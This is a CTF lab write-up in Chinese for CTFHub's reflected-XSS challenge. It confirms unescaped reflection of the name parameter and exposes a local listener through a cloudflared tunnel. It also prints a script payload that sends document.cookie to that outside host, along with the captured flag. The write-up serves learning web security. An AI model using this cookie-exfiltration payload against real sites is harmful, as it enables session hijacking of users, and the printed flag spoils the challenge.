---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 反射型"
date: 2026-10-27

skill: "web-xss/反射型XSS"
completed: true
---

# CTFHub Writeup - 反射型

## 题目类型

Web

## 题目描述

XSS Reflex
What's your name
CTFHub
Hello, CTFHub
Send URL to Bot

## 解题过程

<br>1. 先用 curl 访问带 name 参数的地址，提交 %3Cscript%3Ealert(1)%3C/script%3E，响应中原样出现 \<h1\>Hello, \<script\>alert(1)\</script\>\</h1\>，说明反射点没有过滤。
<br>2. 页面提供 Send URL to Bot，前端会向 /submit 发送 POST 请求，JSON 中携带目标 URL；本次返回 \{"code": 0, "msg": "Successfully"\}。记录中特别说明该返回只代表 URL 已入队，不能作为 payload 是否生效的判定。
<br>3. 随后搭建本地监听 xss\_listener.py，监听 127.0.0.1:8000 并把请求写入 hits.log；再用 cloudflared tunnel --url http://127.0.0.1:8000 获得公网地址 https://international-fiction-determining-dressed.trycloudflare.com。payload 使用 \<script\>new Image().src='https://xxx.trycloudflare.com/?c='+encodeURIComponent(document.cookie)\</script\>，拼成 http://challenge-xxx:10800/?name=\<urlencode(payload)\> 后提交给 /submit。
<br>4. 监听日志中先出现 GET /selftest，UA=Python-urllib/3.14；随后出现 GET /?c=flag%3Dctfhub%7B27179b4e26b1512a79794ec2%7D，UA 为 HeadlessChrome/112。将 c 参数解码得到 flag=ctfhub\{27179b4e26b1512a79794ec2\}。

## 其他方法

推测也可以借助第三方 XSS 平台作为接收端，把携带 document.cookie 的请求记录在平台侧；记录中提到官方解法通常需要注册 xs.pe 一类平台，但本次并未实际使用该方式。


## 疑问与解答

### 1.

<br>问题：什么是 XSS？
<br>解答：XSS 即跨站脚本，攻击者让页面把恶意脚本当成正常内容返回，浏览器在受害者上下文中执行该脚本；反射型 XSS 常见于 URL 参数被原样回显到 HTML 的场景。

### 2.

<br>问题：为什么 /submit 返回 Successfully 仍不能说明 payload 成功？
<br>解答：该响应只表示 URL 已被加入 Bot 访问队列，Bot 是否访问、脚本是否执行、Cookie 是否外带都需要看接收端日志或 Bot 侧结果。

### 3.

<br>问题：为什么用 new Image().src 外带 Cookie？
<br>解答：新建 Image 对象会发起一次 GET 请求，把 document.cookie 经 encodeURIComponent 编码后拼到 URL 查询参数中，接收端记录请求即可取得数据；这种方式不依赖页面跳转。


## 本题的核心逻辑：



<br>反射型 XSS 的核心是服务端把 URL 参数直接拼进响应 HTML，未做转义，浏览器随后把其中的 script 当作页面脚本执行；本题中 name 参数的回显正是这个入口。

<br>Bot 在浏览器环境中访问提交的 URL 后会执行注入脚本，脚本读取 document.cookie 并把内容发到外部接收端；由于 Flag 位于 Bot 的 Cookie 中，日志里出现的就是被外带的数据。


## 笔记

这道题主要学习了：

<br>1. 反射型 XSS 的验证不能只看提交接口返回 Successfully，它只表示 URL 已入队；实际效果要看 Bot 是否执行 payload 以及接收端是否收到数据。
<br>2. 外带数据时需要让 Bot 能访问接收端，公网隧道可以把本地监听暴露出去；通过 UA 区分自测请求和 HeadlessChrome 发起的 Bot 请求，是排查 payload 是否真正生效的实用方法。
